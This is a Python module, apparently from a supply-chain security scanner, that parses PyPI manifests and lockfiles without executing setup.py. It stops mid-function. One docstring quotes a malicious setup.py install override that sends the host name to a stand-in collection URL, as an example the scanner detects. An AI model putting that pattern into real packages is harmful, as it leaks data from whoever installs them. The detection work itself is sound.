"""PyPI: pyproject.toml, requirements files, Pipfile and Poetry.

``setup.py`` is treated as **source code to analyse, never as a module to
import**. That is the whole point of the rule: a setup script is arbitrary
Python that executes at install time, so importing one to read its metadata
would run exactly the code the scanner exists to inspect. Metadata is recovered
by walking the parsed syntax tree for literal assignments only, using Python's
own ``ast`` module, which parses without executing.
"""

from __future__ import annotations

import ast
import re
import tomllib
from pathlib import PurePosixPath
from typing import TYPE_CHECKING, Any

from cordon_scanner.core.models import Hook, Scope
from cordon_scanner.core.pysyntax import PythonSyntax
from cordon_scanner.ecosystems.base import (
    BaseEcosystem,
    DeclaredDependency,
    LockEntry,
    LockGraph,
    Manifest,
)

if TYPE_CHECKING:
    from cordon_scanner.core.content import FileContent

# PEP 508: strip the version specifier, extras and environment marker from a
# requirement to recover the bare name.
_REQUIREMENT = re.compile(r"^\s*([A-Za-z0-9][A-Za-z0-9._-]*)\s*(?:\[[^\]]*\])?\s*(.*)$")

_INLINE_OPTION = re.compile(r"\s-{1,2}[A-Za-z]")
"""The start of a pip option following a requirement on the same line.

`req==1.0 --hash=sha256:...` and `req==1.0 --global-option=x` are both legal.
Anything from here on describes how to install the requirement, not which
requirement it is.
"""


class PypiManifest:
    """Requirement lines and pyproject metadata."""

    @staticmethod
    def _cut_options(text: str) -> str:
        """Drop the environment marker and any same-line pip options."""
        body = text.split(";", 1)[0]
        option = _INLINE_OPTION.search(body)
        if option is not None:
            body = body[: option.start()]
        return body.strip().rstrip("\\").strip()

    @staticmethod
    def _version_of(text: str) -> str:
        """The pinned version alone, with no trailing options or continuation."""
        return PypiManifest._cut_options(text)

    @staticmethod
    def _spec_of(text: str) -> str:
        """The version specifier alone, with no trailing options."""
        return PypiManifest._cut_options(text)

    @staticmethod
    def _in_requirements_dir(path: str) -> bool:
        """Is this file inside a `requirements/` directory, at any depth?

        `requirements/base.txt` at the root and `backend/requirements/base.txt` in a monorepo are
        the same file to a reader and have to be the same file here.
        """
        return "requirements" in PurePosixPath(path).parts[:-1]

    @staticmethod
    def _repository_of(project: dict[str, object]) -> str | None:
        """The source repository a `pyproject.toml` claims.

        PyPI has no single field for it: projects put the repository under
        `project.urls` with any of several keys, and which one is used varies by
        generator. The order here is most-specific first, so a project declaring
        both a homepage and a repository is read as claiming the repository.
        """
        urls = project.get("urls")
        if not isinstance(urls, dict):
            return None
        for key in ("Repository", "Source", "Source Code", "source", "repository", "Homepage"):
            value = urls.get(key)
            if isinstance(value, str) and value:
                return value
        return None


_PEP508_NAME = re.compile(r"\s*([A-Za-z0-9](?:[A-Za-z0-9._-]{0,200}[A-Za-z0-9])?)")
_EGG = re.compile(r"[#&]egg=([A-Za-z0-9][A-Za-z0-9._-]{0,200})")


class PypiRequirement:
    """A PEP 508 requirement: `name[extra1,extra2] (>=1,<2) ; marker` or `name @ url ; marker`.

    Everything a requirement says is kept: the extras (each can pull in dependencies of its own),
    the environment marker (`sys_platform == "win32"`, `python_version < "3.11"`: the conditions
    under which it is installed at all), and a direct URL or VCS reference.
    """

    @staticmethod
    def parse(text: str) -> tuple[str, tuple[str, ...], str, str | None, bool] | None:
        """`(name, extras, spec, marker, is_url)`, or None when no name can be read."""
        body = text.strip()
        if not body or body.startswith("-"):
            return None
        marker: str | None = None
        # The marker follows the first `;`. In the URL form PEP 508 requires whitespace before it,
        # because a URL may itself contain `;`.
        at_url = re.search(r"\s@\s|^[^\s\[]+(?:\[[^\]]*\])?\s*@", body)
        if at_url:
            split = re.search(r"\s;", body)
            if split:
                body, marker = body[: split.start()], body[split.end() :]
        elif ";" in body:
            body, _, marker = body.partition(";")
        matched = _PEP508_NAME.match(body)
        if not matched:
            return None
        name = matched.group(1)
        rest = body[matched.end() :].lstrip()
        extras: tuple[str, ...] = ()
        if rest.startswith("["):
            close = rest.find("]")
            if close < 0:
                return None
            extras = tuple(e.strip() for e in rest[1:close].split(",") if e.strip())
            rest = rest[close + 1 :].lstrip()
        if rest.startswith("@"):
            return name, extras, rest[1:].strip(), (marker or "").strip() or None, True
        spec = PypiManifest._cut_options(rest).strip()
        if spec.startswith("(") and spec.endswith(")"):
            spec = spec[1:-1].strip()
        return name, extras, spec or "*", (marker or "").strip() or None, False

    @staticmethod
    def declared(text: str, scope: Scope, field_name: str) -> DeclaredDependency | None:
        parsed = PypiRequirement.parse(text)
        if parsed is None:
            return None
        name, extras, spec, marker, _ = parsed
        return DeclaredDependency(
            name=name,
            spec=spec,
            scope=scope,
            field_name=field_name,
            platform=(marker,) if marker else (),
            extras=extras,
        )

    @staticmethod
    def editable(target: str, field_name: str) -> DeclaredDependency:
        """`-e .`, `-e ./libs/x`, `-e git+https://host/repo.git@ref#egg=name`: installed in place.
        The name is the `#egg=` fragment when there is one, otherwise the directory's own."""
        text = target.strip()
        egg = _EGG.search(text)
        if egg:
            name = egg.group(1)
        else:
            name = text.rstrip("/").rpartition("/")[2] or "."
            name = "." if name in (".", "") else name
        return DeclaredDependency(
            name=name, spec=text, scope=Scope.RUNTIME, field_name=field_name, editable=True
        )


_NORMALIZE = re.compile(r"[-_.]+")

_REQUIREMENT_NAME = re.compile(r"[\s<>=!~;\[\(]")
"""The first character of a requirement string that cannot belong to a name."""


class PypiEcosystem(BaseEcosystem):
    @staticmethod
    def _poetry_spec(value: object) -> str:
        """Render a table-valued dependency spec as a string."""
        if isinstance(value, dict):
            for key in ("version", "git", "url", "path"):
                if key in value:
                    return str(value[key])
            return "*"
        return str(value)

    @staticmethod
    def _poetry_entries(
        name: str, spec: object, scope: Scope, field_name: str
    ) -> list[DeclaredDependency]:
        """One Poetry (or Pipfile) dependency value: a string, a table, or a list of tables.

        A table can carry `version`, `git` + `rev`/`tag`/`branch`, `path` (+ `develop`), `url`,
        `extras`, `markers`, `python`, `platform` and `optional`; a list holds one table per
        environment (`[{version = "<2", python = "<3.8"}, {version = ">=2", python = ">=3.8"}]`).
        """
        values = spec if isinstance(spec, list) else [spec]
        out: list[DeclaredDependency] = []
        for value in values:
            if isinstance(value, str):
                out.append(
                    DeclaredDependency(name=name, spec=value, scope=scope, field_name=field_name)
                )
                continue
            if not isinstance(value, dict):
                continue
            text = PypiEcosystem._poetry_spec(value)
            if "git" in value:
                ref = value.get("rev") or value.get("tag") or value.get("branch")
                text = f"git+{value['git']}" + (f"@{ref}" if ref else "")
            conditions: list[str] = []
            for key in ("markers", "python", "platform", "sys_platform"):
                if isinstance(value.get(key), str):
                    conditions.append(value[key] if key == "markers" else f"{key} {value[key]}")
            extras = value.get("extras")
            out.append(
                DeclaredDependency(
                    name=name,
                    spec=text,
                    scope=Scope.OPTIONAL
                    if value.get("optional") is True and scope is Scope.RUNTIME
                    else scope,
                    field_name=field_name,
                    platform=tuple(conditions),
                    extras=tuple(str(e) for e in extras) if isinstance(extras, list) else (),
                    editable=bool(value.get("develop") or value.get("editable")),
                )
            )
        return out

    @staticmethod
    def _first_hash(package: dict[str, Any]) -> str | None:
        files = package.get("files")
        if isinstance(files, list):
            for entry in files:
                if isinstance(entry, dict) and entry.get("hash"):
                    return str(entry["hash"])
        return None

    @staticmethod
    def _str_or_none(value: object) -> str | None:
        return str(value) if isinstance(value, str) and value else None

    id = "pypi"
    purl_type = "pypi"
    manifest_globs: tuple[str, ...] = (
        "**/pyproject.toml",
        "**/setup.py",
        "**/setup.cfg",
        "**/requirements*.txt",
        "**/requirements/*.txt",
        "**/requirements*.in",
        # `requirements/base.in` as well as `requirements.in`, for the reason the `.txt` pair
        # above needed it. A `.in` is pip-compile's INPUT - the file a person edits, where a
        # dependency is first named and where a typosquatted name would be introduced - so a
        # layout that splits it by environment was the one hiding the human-authored half of
        # the dependency list. It is a manifest only, never a lockfile: a `.in` carries ranges
        # and no hashes by design, and reporting one as resolved would claim a precision the
        # file does not have.
        "**/requirements/*.in",
        "**/Pipfile",
    )
    lockfile_globs: tuple[str, ...] = (
        "**/poetry.lock",
        "**/Pipfile.lock",
        "**/pdm.lock",
        "**/uv.lock",
        "**/requirements*.txt",
        # `requirements/base.txt`, not just `requirements.txt`. `manifest_globs` has carried
        # both spellings from the start; this list had only the first, so the pip-tools layout
        # -- a `requirements/` directory holding `base.txt`, `dev.txt`, `prod.txt`, which is
        # what `pip-compile` produces for anything larger than a toy -- was read as a manifest
        # and never as a lockfile. `_parse_pinned_requirements` reads `--hash=` continuations
        # correctly and was simply never reached, so every hash-pinned dependency in those
        # files was reported by `POLICY.DEPENDENCY.INTEGRITY.001` as carrying no hash.
        #
        # The finding was the exact inverse of the truth: the projects most likely to split
        # requirements across a directory are the ones large enough to have adopted hash
        # pinning, so the accusation landed hardest on the files that had done the work.
        "**/requirements/*.txt",
    )
    registry_hosts: frozenset[str] = frozenset(
        {"pypi.org", "files.pythonhosted.org", "pypi.python.org"}
    )

    def normalize_name(self, name: str) -> str:
        """PEP 503 normalisation.

        Runs of ``-``, ``_`` and ``.`` are equivalent and fold to a single
        hyphen, and comparison is case-insensitive. Without this, ``zope.interface``,
        ``zope-interface`` and ``Zope_Interface`` look like three different
        packages, which breaks both advisory matching and typosquat detection in
        opposite directions.
        """
        return _NORMALIZE.sub("-", name.strip().lower())

    # -- Manifests -------------------------------------------------------

    def parse_manifest(self, content: FileContent) -> Manifest:
        name = content.basename
        if name == "pyproject.toml":
            return self._parse_pyproject(content)
        if name == "setup.py":
            return self._parse_setup_py(content)
        if name == "Pipfile":
            return self._parse_pipfile(content)
        if name == "setup.cfg":
            return self._parse_setup_cfg(content)
        if name.startswith("requirements") or PypiManifest._in_requirements_dir(content.path):
            return self._parse_requirements(content)
        return Manifest(path=content.path, ecosystem=self.id)

    def _parse_pyproject(self, content: FileContent) -> Manifest:
        try:
            data = tomllib.loads(content.text)
        except (tomllib.TOMLDecodeError, ValueError) as exc:
            return Manifest(
                path=content.path, ecosystem=self.id, parse_error=f"invalid TOML: {exc}"
            )

        project = data.get("project") or {}
        declared: list[DeclaredDependency] = []
        repository = PypiManifest._repository_of(project)

        for spec in project.get("dependencies") or []:
            parsed = self._declared(str(spec), Scope.RUNTIME, "project.dependencies")
            if parsed:
                declared.append(parsed)

        for extra, specs in (project.get("optional-dependencies") or {}).items():
            for spec in specs or []:
                parsed = self._declared(str(spec), Scope.OPTIONAL, f"optional-dependencies.{extra}")
                if parsed:
                    declared.append(parsed)

        python = self._python(project.get("requires-python"), "project.requires-python")
        if python is not None:
            declared.append(python)

        # PEP 735 dependency groups: development, test, docs -- never installed with the package.
        groups = data.get("dependency-groups")
        if isinstance(groups, dict):
            for group, specs in groups.items():
                scope = Scope.TEST if "test" in str(group).lower() else Scope.DEV
                for spec in specs if isinstance(specs, list) else ():
                    if isinstance(spec, str):
                        parsed = self._declared(spec, scope, f"dependency-groups.{group}")
                        if parsed:
                            declared.append(parsed)

        # The requirements of the build itself (setuptools, hatchling, a build-time code
        # generator): installed into the build environment of every source install.
        build_requires = (data.get("build-system") or {}).get("requires")
        for spec in build_requires if isinstance(build_requires, list) else ():
            if isinstance(spec, str):
                parsed = self._declared(spec, Scope.BUILD, "build-system.requires")
                if parsed:
                    declared.append(parsed)

        # Poetry keeps its dependencies elsewhere: the main table, the legacy dev table, and one
        # table per group (`[tool.poetry.group.test.dependencies]`).
        poetry = (data.get("tool") or {}).get("poetry") or {}
        tables: list[tuple[str, Scope, object]] = [
            ("tool.poetry.dependencies", Scope.RUNTIME, poetry.get("dependencies")),
            ("tool.poetry.dev-dependencies", Scope.DEV, poetry.get("dev-dependencies")),
        ]
        poetry_groups = poetry.get("group")
        if isinstance(poetry_groups, dict):
            for group, body in poetry_groups.items():
                if isinstance(body, dict):
                    scope = Scope.TEST if "test" in str(group).lower() else Scope.DEV
                    tables.append(
                        (f"tool.poetry.group.{group}.dependencies", scope, body.get("dependencies"))
                    )
        for field_name, scope, table in tables:
            for pkg, spec in (table if isinstance(table, dict) else {}).items():
                if pkg == "python":
                    entry = self._python(spec, f"{field_name}.python")
                    if entry is not None:
                        declared.append(entry)
                    continue
                declared.extend(PypiEcosystem._poetry_entries(str(pkg), spec, scope, field_name))

        hooks: list[Hook] = []
        build = data.get("build-system") or {}
        backend = build.get("build-backend")
        if isinstance(backend, str) and backend.startswith("."):
            # A local build backend is code in this repository that runs during
            # every build, including inside the packaging environment.
            hooks.append(
                Hook(
                    kind="build",
                    path=content.path,
                    name="build-backend",
                    command=backend,
                    ecosystem=self.id,
                )
            )

        return Manifest(
            path=content.path,
            ecosystem=self.id,
            name=PypiEcosystem._str_or_none(project.get("name"))
            or PypiEcosystem._str_or_none(poetry.get("name")),
            version=PypiEcosystem._str_or_none(project.get("version"))
            or PypiEcosystem._str_or_none(poetry.get("version")),
            dependencies=tuple(declared),
            hooks=tuple(hooks),
            repository=repository,
        )

    def _parse_setup_py(self, content: FileContent) -> Manifest:
        """Recover metadata from setup.py without executing it.

        ``ast.parse`` builds a syntax tree and runs nothing. Only literal
        arguments are read; anything computed is deliberately ignored rather
        than evaluated, because evaluating it is the attack.

        The file is always registered as a build hook regardless of what is
        found, because its mere existence means arbitrary Python executes at
        install time.
        """
        hooks: list[Hook] = [
            Hook(
                kind="build",
                path=content.path,
                name="setup.py",
                command="python setup.py",
                ecosystem=self.id,
            )
        ]

        try:
            tree = PythonSyntax.parse(content.text, filename=content.path)
        except SyntaxError as exc:
            return Manifest(
                path=content.path,
                ecosystem=self.id,
                hooks=tuple(hooks),
                parse_error=f"could not parse: {exc}",
            )

        override = self._install_override_hook(tree, content.path)
        if override is not None:
            hooks.append(override)

        name: str | None = None
        version: str | None = None
        declared: list[DeclaredDependency] = []

        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            func = node.func
            called = (
                func.id
                if isinstance(func, ast.Name)
                else func.attr
                if isinstance(func, ast.Attribute)
                else ""
            )
            if called != "setup":
                continue

            for keyword in node.keywords:
                if keyword.arg == "name" and isinstance(keyword.value, ast.Constant):
                    if isinstance(keyword.value.value, str):
                        name = keyword.value.value
                elif keyword.arg == "version" and isinstance(keyword.value, ast.Constant):
                    if isinstance(keyword.value.value, str):
                        version = keyword.value.value
                elif keyword.arg == "install_requires":
                    declared.extend(
                        self._from_literal_list(keyword.value, Scope.RUNTIME, "install_requires")
                    )
                elif keyword.arg == "setup_requires":
                    declared.extend(
                        self._from_literal_list(keyword.value, Scope.BUILD, "setup_requires")
                    )
                elif keyword.arg == "tests_require":
                    declared.extend(
                        self._from_literal_list(keyword.value, Scope.TEST, "tests_require")
                    )
                elif keyword.arg == "extras_require" and isinstance(keyword.value, ast.Dict):
                    for key, value in zip(keyword.value.keys, keyword.value.values, strict=True):
                        extra = (
                            str(key.value)
                            if isinstance(key, ast.Constant) and isinstance(key.value, str)
                            else "?"
                        )
                        declared.extend(
                            self._from_literal_list(
                                value, Scope.OPTIONAL, f"extras_require.{extra}"
                            )
                        )
                elif keyword.arg == "python_requires" and isinstance(keyword.value, ast.Constant):
                    python = self._python(keyword.value.value, "python_requires")
                    if python is not None:
                        declared.append(python)

        return Manifest(
            path=content.path,
            ecosystem=self.id,
            name=name,
            version=version,
            dependencies=tuple(declared),
            hooks=tuple(hooks),
        )

    #: setuptools commands that run on the machine of whoever installs the package.
    #:
    #: `install` is the one that matters and the one the malware overrides. The
    #: others here are its parts: setuptools dispatches `install_lib` and
    #: `install_scripts` from it, and overriding either reaches a consumer just the
    #: same.
    #:
    #: Everything NOT in this set is the reason the set exists. `build_ext`,
    #: `build_py` and `build_clib` run when the package is built; `sdist` and
    #: `bdist_wheel` when it is packaged; `develop` when somebody types
    #: `pip install -e` in the project's own directory. None reaches a consumer
    #: installing from a wheel or an sdist, and legitimate projects override
    #: exactly those: `vllm` subclasses `build_ext` and `build_rust`,
    #: `saltstack/salt` subclasses `develop`, `sdist` and `bdist_egg`. Neither
    #: subclasses `install`, and the malware always does.
    #:
    #: The same distinction npm has documented since version 7 and that
    #: `core.models.CONSUMER_TIME_HOOKS` already draws for `postinstall` against
    #: `prepare`.
    CONSUMER_INSTALL_COMMANDS = frozenset({"install", "install_lib", "install_scripts"})

    def _install_override_hook(self, tree: ast.AST, path: str) -> Hook | None:
        """A `cmdclass` override of a consumer-time install command.

        Two halves, both required. A class has to subclass one of
        `CONSUMER_INSTALL_COMMANDS`, and `setup()` has to be told to use it --
        a subclass nobody wires in runs on nobody's machine.

        Measured: 82 of the 252 real malicious PyPI packages still undetected
        after the recall work are this shape, and it is written the same way every
        time:

            class CustomInstall(install):
                def run(self):
                    install.run(self)
                    requests.get("https://collect.invalid/p?h=" + hostname)

            setup(..., cmdclass={"install": CustomInstall})

        Reading it without executing it is the whole point; `ast.parse` runs
        nothing, which is the same reason this module already recovers metadata
        this way.
        """
        # `from setuptools.command.install import install as _install`: the base is
        # written under its alias, and the command it names is the original.
        aliases = {
            alias.asname: alias.name
            for node in ast.walk(tree)
            if isinstance(node, ast.ImportFrom)
            for alias in node.names
            if alias.asname
        }
        overriding: set[str] = set()
        for node in ast.walk(tree):
            if not isinstance(node, ast.ClassDef):
                continue
            for base in node.bases:
                named = (
                    base.id
                    if isinstance(base, ast.Name)
                    else base.attr
                    if isinstance(base, ast.Attribute)
                    else ""
                )
                if aliases.get(named, named) in self.CONSUMER_INSTALL_COMMANDS:
                    overriding.add(node.name)
        if not overriding:
            return None

        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            for keyword in node.keywords:
                if keyword.arg != "cmdclass" or not isinstance(keyword.value, ast.Dict):
                    continue
                for key, value in zip(keyword.value.keys, keyword.value.values, strict=True):
                    wired = (
                        value.id
                        if isinstance(value, ast.Name)
                        else value.attr
                        if isinstance(value, ast.Attribute)
                        else ""
                    )
                    command = (
                        key.value
                        if isinstance(key, ast.Constant) and isinstance(key.value, str)
                        else ""
                    )
                    if wired in overriding and command in self.CONSUMER_INSTALL_COMMANDS:
                        return Hook(
                            kind="consumerinstall",
                            path=path,
                            name="install",
                            command=f"python setup.py install ({wired}.run)",
                            ecosystem=self.id,
                        )
        return None

    def _from_literal_list(
        self, node: ast.expr, scope: Scope, field_name: str
    ) -> list[DeclaredDependency]:
        """Read a list of string literals, ignoring anything computed."""
        if not isinstance(node, (ast.List, ast.Tuple)):
            return []
        out: list[DeclaredDependency] = []
        for element in node.elts:
            if isinstance(element, ast.Constant) and isinstance(element.value, str):
                parsed = self._declared(element.value, scope, field_name)
                if parsed:
                    out.append(parsed)
        return out

    _OPTION = re.compile(r"^(-[A-Za-z]|--[a-z-]{2,40})(?:[=\s]\s*(.*))?$")

    def _parse_requirements(self, content: FileContent) -> Manifest:
        """A pip requirements file: requirements, and the options that change what they mean.

        ```
          -r / --requirement FILE      another requirements file, read as part of this one
          -c / --constraint FILE       pins that apply to whatever the requirements resolve
          -e / --editable TARGET       a project installed in place (path or VCS URL)
          -i / --index-url URL         where resolution looks (and --extra-index-url beside it)
          --hash=...                   integrity, read where the file is a lockfile
        ```
        """
        declared: list[DeclaredDependency] = []
        includes: list[tuple[str, str]] = []
        sources: list[str] = []
        lines = PypiEcosystem._logical_lines(content.text)
        for line in lines:
            option = self._OPTION.match(line) if line.startswith("-") else None
            if option is not None:
                flag, value = option.group(1), (option.group(2) or "").strip()
                if flag in ("-r", "--requirement") and value:
                    includes.append(("requirements", value))
                elif flag in ("-c", "--constraint") and value:
                    includes.append(("constraints", value))
                elif flag in ("-e", "--editable") and value:
                    entry = PypiRequirement.editable(value, content.basename)
                    if entry.name != ".":
                        declared.append(entry)
                elif (
                    flag in ("-i", "--index-url", "--extra-index-url", "-f", "--find-links")
                    and value
                ):
                    kind = {"-i": "index-url", "-f": "find-links"}.get(flag, flag.lstrip("-"))
                    sources.append(f"{kind} {value.split()[0]}")
                continue
            parsed = self._declared(line, Scope.RUNTIME, content.basename)
            if parsed:
                declared.append(parsed)
        return Manifest(
            path=content.path,
            ecosystem=self.id,
            dependencies=tuple(declared),
            includes=tuple(includes),
            sources=tuple(sources),
        )

    @staticmethod
    def _logical_lines(text: str) -> list[str]:
        """Lines with comments removed and `\\` continuations joined, as pip reads them."""
        out: list[str] = []
        pending = ""
        for raw in text.splitlines():
            line = re.sub(r"(^|\s)#.*$", "", raw).rstrip()
            if line.endswith("\\"):
                pending += line[:-1] + " "
                continue
            line = (pending + line).strip()
            pending = ""
            if line:
                out.append(line)
        if pending.strip():
            out.append(pending.strip())
        return out

    def parse_included(self, content: FileContent) -> Manifest:
        """A file named by `-r` or `-c`, whatever it is called: always pip's requirements format."""
        return self._parse_requirements(content)

    def _parse_setup_cfg(self, content: FileContent) -> Manifest:
        """`[metadata]` and `[options]` of a setuptools configuration, read with configparser.

        Declarative: unlike setup.py, nothing here can run, and the file is read for what it says.
        """
        import configparser

        parser = configparser.ConfigParser(interpolation=None, strict=False)
        try:
            parser.read_string(content.text)
        except configparser.Error as exc:
            return Manifest(
                path=content.path, ecosystem=self.id, parse_error=f"invalid setup.cfg: {exc}"
            )
        declared: list[DeclaredDependency] = []

        def requirements(section: str, key: str, scope: Scope) -> None:
            if parser.has_option(section, key):
                for line in parser.get(section, key).splitlines():
                    entry = self._declared(line, scope, f"{section}.{key}")
                    if entry is not None:
                        declared.append(entry)

        requirements("options", "install_requires", Scope.RUNTIME)
        requirements("options", "setup_requires", Scope.BUILD)
        requirements("options", "tests_require", Scope.TEST)
        if parser.has_section("options.extras_require"):
            for extra in parser.options("options.extras_require"):
                requirements("options.extras_require", extra, Scope.OPTIONAL)
        if parser.has_option("options", "python_requires"):
            python = self._python(
                parser.get("options", "python_requires"), "options.python_requires"
            )
            if python is not None:
                declared.append(python)
        name = parser.get("metadata", "name", fallback=None)
        version = parser.get("metadata", "version", fallback=None)
        return Manifest(
            path=content.path,
            ecosystem=self.id,
            name=name.strip() if name else None,
            version=version.strip()
            if version and not version.strip().startswith("attr:")
            else None,
            dependencies=tuple(declared),
        )

    def _parse_pipfile(self, content: FileContent) -> Manifest:
        try:
            data = tomllib.loads(content.text)
        except (tomllib.TOMLDecodeError, ValueError) as exc:
            return Manifest(
                path=content.path, ecosystem=self.id, parse_error=f"invalid TOML: {exc}"
            )
        declared: list[DeclaredDependency] = []
        for section, scope in (("packages", Scope.RUNTIME), ("dev-packages", Scope.DEV)):
            for pkg, spec in (data.get(section) or {}).items():
                declared.extend(PypiEcosystem._poetry_entries(str(pkg), spec, scope, section))
        requires = data.get("requires")
        if isinstance(requires, dict):
            python = self._python(
                requires.get("python_full_version") or requires.get("python_version"), "requires"
            )
            if python is not None:
                declared.append(python)
        listed = [
            s
            for s in data.get("source") or ()
            if isinstance(s, dict) and isinstance(s.get("url"), str)
        ]
        # Pipenv hands every source after the first to pip as an extra index, unless each package
        # names its `index`: the same merge `--extra-index-url` makes.
        pinned = all(
            isinstance(spec, dict) and spec.get("index")
            for section in ("packages", "dev-packages")
            for spec in (data.get(section) or {}).values()
        )
        sources = tuple(
            f"{'index-url' if n == 0 or pinned else 'extra-index-url'} {s['url']}"
            for n, s in enumerate(listed)
        )
        return Manifest(
            path=content.path, ecosystem=self.id, dependencies=tuple(declared), sources=sources
        )

    @staticmethod
    def _declared(spec: str, scope: Scope, field_name: str) -> DeclaredDependency | None:
        return PypiRequirement.declared(spec, scope, field_name)

    @staticmethod
    def _python(spec: object, field_name: str) -> DeclaredDependency | None:
        """The Python versions a project supports, as a platform requirement (never a package:
        `python` on PyPI is an unrelated distribution, and no registry check applies)."""
        if isinstance(spec, str) and spec.strip():
            return DeclaredDependency(
                name="python", spec=spec.strip(), scope=Scope.PLATFORM, field_name=field_name
            )
        return None

    # -- Lockfiles -------------------------------------------------------

    def parse_lockfile(self, content: FileContent) -> LockGraph:
        name = content.basename
        if name == "poetry.lock":
            return self._parse_poetry_lock(content)
        if name == "Pipfile.lock":
            return self._parse_pipfile_lock(content)
        if name in {"pdm.lock", "uv.lock"}:
            return self._parse_pep_style_lock(content)
        # Matched on the DIRECTORY as well as the name, exactly as `parse_manifest` does - the
        # two dispatches answer the same question about the same file, and disagreeing is how
        # `requirements/base.txt` reached one parser and not the other.
        #
        # On any path SEGMENT rather than the prefix: in a monorepo the file is
        # `backend/requirements/base.txt`, and a `startswith` check sees only the repository
        # root. That is the same narrowness one level up.
        if name.startswith("requirements") or PypiManifest._in_requirements_dir(content.path):
            return self._parse_pinned_requirements(content)
        return LockGraph(
            path=content.path, ecosystem=self.id, parse_error=f"unsupported lockfile: {name}"
        )

    def _parse_poetry_lock(self, content: FileContent) -> LockGraph:
        try:
            data = tomllib.loads(content.text)
        except (tomllib.TOMLDecodeError, ValueError) as exc:
            return LockGraph(
                path=content.path, ecosystem=self.id, parse_error=f"invalid TOML: {exc}"
            )
        packages = [p for p in data.get("package") or [] if isinstance(p, dict)]
        markers = PypiEcosystem._edge_markers(
            (p.get("dependencies") or {})
            for p in packages
            if isinstance(p.get("dependencies"), dict)
        )
        entries: list[LockEntry] = []
        for package in packages:
            name = PypiEcosystem._str_or_none(package.get("name"))
            if not name:
                continue
            # Poetry 1 writes `category`; Poetry 2 writes `groups`. Only a package in no runtime
            # group is development-only.
            groups = package.get("groups")
            if isinstance(groups, list) and groups:
                scope = Scope.RUNTIME if "main" in groups else Scope.DEV
            else:
                scope = (
                    Scope.DEV if str(package.get("category", "main")) == "dev" else Scope.RUNTIME
                )
            if package.get("optional") is True and scope is Scope.RUNTIME:
                scope = Scope.OPTIONAL
            raw_source = package.get("source")
            source: dict[str, Any] = raw_source if isinstance(raw_source, dict) else {}
            kind = str(source.get("type") or "")
            resolved = PypiEcosystem._str_or_none(source.get("url"))
            if kind == "git" and resolved:
                commit = source.get("resolved_reference") or source.get("reference") or ""
                resolved = f"git+{resolved}" + (f"#{commit}" if commit else "")
            conditions = list(markers.get(self.normalize_name(name), ()))
            for key, label in (("markers", None), ("python-versions", "python")):
                value = package.get(key)
                if isinstance(value, str) and value.strip() and value.strip() != "*":
                    conditions.append(f"{label} {value.strip()}" if label else value.strip())
            entries.append(
                LockEntry(
                    name=name,
                    version=str(package.get("version", "")),
                    integrity=PypiEcosystem._first_hash(package),
                    resolved_from=resolved,
                    scope=scope,
                    dependencies=tuple(sorted((package.get("dependencies") or {}).keys())),
                    local=kind in ("directory", "file")
                    and not str(resolved or "").startswith(("http", "/")),
                    platform=tuple(conditions),
                )
            )
        return LockGraph(path=content.path, ecosystem=self.id, entries=tuple(entries))

    @staticmethod
    def _edge_markers(tables: Any) -> dict[str, tuple[str, ...]]:
        """The environment markers under which each package is required, from its parents' edges.

        `colorama = {version = "*", markers = "sys_platform == \\"win32\\""}` makes colorama a
        Windows-only dependency: the condition belongs to the child, whoever writes it."""
        found: dict[str, list[str]] = {}
        unconditional: set[str] = set()
        for table in tables:
            for child, value in table.items():
                key = _NORMALIZE.sub("-", str(child).lower())
                specs = value if isinstance(value, list) else [value]
                for spec in specs:
                    marker = (
                        spec.get("markers") or spec.get("marker")
                        if isinstance(spec, dict)
                        else None
                    )
                    if isinstance(marker, str) and marker.strip():
                        found.setdefault(key, []).append(marker.strip())
                    else:
                        # Required somewhere without a condition: required everywhere.
                        unconditional.add(key)
        return {k: tuple(dict.fromkeys(v)) for k, v in found.items() if k not in unconditional}

    def _parse_pep_style_lock(self, content: FileContent) -> LockGraph:
        """`uv.lock` and `pdm.lock`, which share poetry's `[[package]]` table and
        nothing else about what is inside it.

        Three fields differ, and every one of them is the kind of difference that
        raises rather than degrades. `dependencies` is an array here -- of tables
        carrying a `name` in uv, of requirement strings in PDM -- where poetry
        writes a table, so reading it as a mapping raises `AttributeError` and
        loses the whole file. Artefact hashes live under `sdist.hash` and
        `wheels[].hash` rather than under `files[].hash`. Scope comes from a
        package's membership of a dependency group rather than from a `category`
        key, which neither format writes.

        Anything unrecognised inside a package leaves that package with the
        default rather than dropping it: a resolver adding a field must not empty
        the graph.
        """
        try:
            data = tomllib.loads(content.text)
        except (tomllib.TOMLDecodeError, ValueError) as exc:
            return LockGraph(
                path=content.path, ecosystem=self.id, parse_error=f"invalid TOML: {exc}"
            )

        packages = data.get("package")
        if not isinstance(packages, list):
            return LockGraph(
                path=content.path,
                ecosystem=self.id,
                parse_error="no [[package]] tables; not a uv or PDM lockfile",
            )

        dev_names = PypiEcosystem._dev_group_names(data)
        tables = [p for p in packages if isinstance(p, dict)]
        markers = PypiEcosystem._pep_style_markers(tables)
        # uv's root: the project itself (`source = { editable = "." }` or `{ virtual = "." }`).
        # Its dependencies are what the project declares; its optional and dev tables, the
        # extras and groups.
        direct: set[str] = set()
        optional: set[str] = set()

        # The workspace's own projects: the root (`editable = "."` or `virtual = "."`) and every
        # member (`editable = "packages/core"`). Each one's dependencies are what the project
        # declares; each member's manifest is joined to this lock (`LockGraph.workspaces`).
        def own_path(package: dict[str, Any]) -> str | None:
            source = package.get("source")
            if not isinstance(source, dict):
                return None
            path = source.get("editable") or source.get("virtual")
            if isinstance(path, str) and not path.startswith(("/", "..")):
                return path
            return None

        roots = [p for p in tables if own_path(p) is not None]
        workspace_paths = sorted({str(own_path(p)) for p in roots} - {".", ""})
        runtime_direct: set[str] = set()
        development: set[str] = set(dev_names)
        for root in roots:
            runtime_direct.update(
                self.normalize_name(n) for n in PypiEcosystem._pep_style_dependencies(root)
            )
            for table, target in (
                ("optional-dependencies", optional),
                ("dev-dependencies", development),
            ):
                groups = root.get(table)
                if isinstance(groups, dict):
                    for members in groups.values():
                        for item in members if isinstance(members, list) else ():
                            name = item.get("name") if isinstance(item, dict) else None
                            if isinstance(name, str):
                                target.add(self.normalize_name(name))
        direct |= runtime_direct | optional | (development if roots else set())
        entries: list[LockEntry] = []
        for package in tables:
            name = PypiEcosystem._str_or_none(package.get("name"))
            if not name:
                continue
            normalized = self.normalize_name(name)
            if package in roots and own_path(package) in (".", ""):
                continue  # the project itself, not one of its dependencies
            raw_source = package.get("source")
